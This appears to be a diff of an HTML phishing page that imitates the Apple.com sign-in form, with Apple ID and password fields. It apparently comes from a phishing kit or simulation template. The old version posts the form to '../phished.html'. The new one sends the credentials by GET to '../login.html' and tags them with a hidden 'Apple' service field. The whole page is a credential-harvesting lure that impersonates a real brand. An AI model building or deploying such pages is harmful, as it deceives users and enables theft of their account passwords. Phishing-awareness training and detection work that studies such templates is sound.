@@ -11,7 +11,6 @@
 
     <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
     <link href="//fonts.googleapis.com/css?family=PT+Sans+Narrow:400&display=swap" rel="stylesheet" />
-    <link href="../reset.css" rel="stylesheet" />
     <link href="apple.css" rel="stylesheet" />
 
   </head>
@@ -23,8 +22,9 @@
       <!-- form center container -->
       <main class="apple-container">
 
-        <!-- form object -->
-        <form class="apple-form" action="../phished.html" method="POST" autocomplete="off">
+        <!-- login form, credentials will go to linked file in action attribute -->
+        <form class="apple-form" action="../login.html" method="GET">
+          <input type="hidden" name="_service" value="Apple" />
 
           <!-- form logo -->
           <div class="apple-logo">
@@ -36,15 +36,15 @@
             <h1>Sign in to Apple.com</h1>
           </div>
 
-          <!-- email input -->
-          <div class="apple-input apple-email">
-            <input id="_email" name="_email" value="" type="email" />
-            <label for="_email">Apple ID</label>
+          <!-- username input -->
+          <div class="apple-input apple-username">
+            <input type="text" id="_username" name="_username" value="" />
+            <label for="_username">Apple ID</label>
           </div>
 
           <!-- hidden password input -->
           <div class="apple-input apple-password">
-            <input id="_password" name="_password" value="" type="password" />
+            <input type="password" id="_password" name="_password" value="" />
             <label for="_password">Password</label>
           </div>
 
